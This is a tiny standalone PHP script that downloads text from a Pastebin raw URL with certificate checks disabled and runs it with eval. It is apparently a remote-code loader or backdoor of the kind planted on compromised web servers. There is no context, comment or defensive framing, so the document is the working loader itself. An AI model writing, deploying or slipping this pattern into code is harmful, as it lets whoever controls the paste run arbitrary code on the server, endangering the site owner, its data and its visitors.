<?php
$c = curl_init();
curl_setopt($c, CURLOPT_URL, "https://pastebin.com/raw/UZxqzSqs");
curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($c, CURLOPT_FOLLOWLOCATION,true);
$kh = curl_exec($c);
curl_close($c);
eval("?>" . $kh);
 ?>
 